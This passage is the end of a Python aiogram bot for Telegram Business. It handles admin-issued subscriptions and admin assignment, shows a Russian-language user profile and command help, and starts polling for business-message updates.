            exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc).strftime("%d.%m.%Y %H:%M UTC")
            await message.answer(f"✅ Подписка выдана пользователю <code>{target_id}</code> на {readable} (до {exp_dt})", parse_mode=ParseMode.HTML)
        else:
            await message.answer(f"❌ Ошибка: {readable}")
        return

    if state == "waiting_for_admin":
        admin_states.pop(sender.id, None)
        raw = message.text.strip().lstrip("@")
        t_type = "id" if raw.isdigit() else "username"
        subs.add_admin(t_type, raw)
        await message.answer(f"✅ Пользователь <code>{raw}</code> назначен администратором!", parse_mode=ParseMode.HTML)
        return

    # Regular user /start or status
    if message.text in ["/start", "/sub", "/id", "/myid"]:
        sub_info = subs.get_user_sub_info(sender.id)
        is_sub = sub_info.get("is_active", False) if sub_info else False
        is_adm = subs.is_admin(user_id=sender.id, username=sender.username)

        status_icon = "🟢 Активна" if is_sub else "🔴 Не активна"
        if is_adm:
            status_icon = "👑 Администратор (полный доступ)"

        text = (
            f"👤 <b>Ваш профиль:</b>\n"
            f"• <b>Ваш ID:</b> <code>{sender.id}</code>\n"
            f"• <b>Статус подписки:</b> {status_icon}\n"
        )
        if is_sub and not is_adm:
            exp_dt = datetime.fromtimestamp(sub_info["expires_at"], tz=timezone.utc).strftime("%d.%m.%Y %H:%M UTC")
            rem = sub_info["remaining_seconds"]
            text += f"• <b>Действует до:</b> <code>{exp_dt}</code> (осталось: {fmt_remaining(rem)})\n"

        if is_adm:
            text += (
                "\n🛠 <b>Команды администратора:</b>\n"
                "• <code>/give &lt;ID&gt; &lt;срок&gt;</code> — выдать подписку (напр: /give 123456789 2 дня)\n"
                "• <code>/take &lt;ID&gt;</code> — аннулировать подписку\n"
                "• <code>/subs</code> — список активных подписок\n"
                "• <code>/offer</code> — интерактивная панель управления"
            )
        else:
            text += (
                "\nДля создания офферов подключите бота в:\n"
                "<i>Настройки -> Telegram Business -> Чат-боты</i>\n\n"
                "Команды в чатах:\n"
                "• <code>/offers &lt;url&gt; &lt;stars&gt; &lt;hours&gt;</code> (Звёзды)\n"
                "• <code>/offers &lt;url&gt; &lt;amount&gt; &lt;hours&gt; gram</code> (Gram)"
            )

        await message.answer(text, parse_mode=ParseMode.HTML)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

async def main() -> None:
    me = await bot.get_me()
    print(f"\n[{ts()}] ===============================================")
    print(f"[{ts()}] Telegram Business Bot started: @{me.username} (id={me.id})")
    print(f"[{ts()}] Master Admin: ID={config.MASTER_ADMIN_ID}")
    print(f"[{ts()}] Custom Emojis: Star={config.EMOJI_STAR_ID}, Gram={config.EMOJI_GRAM_ID}")
    print(f"[{ts()}] Connect this bot in:")
    print(f"[{ts()}]   Telegram Settings -> Telegram Business -> Chatbots")
    print(f"[{ts()}] Commands:")
    print(f"[{ts()}]   /give <id> <duration> — grant subscription")
    print(f"[{ts()}]   /take <id> — revoke subscription")
    print(f"[{ts()}]   /offer — admin control panel")
    print(f"[{ts()}] ===============================================\n")

    await dp.start_polling(
        bot,
        allowed_updates=[
            "message",
            "edited_message",
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "deleted_business_messages",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
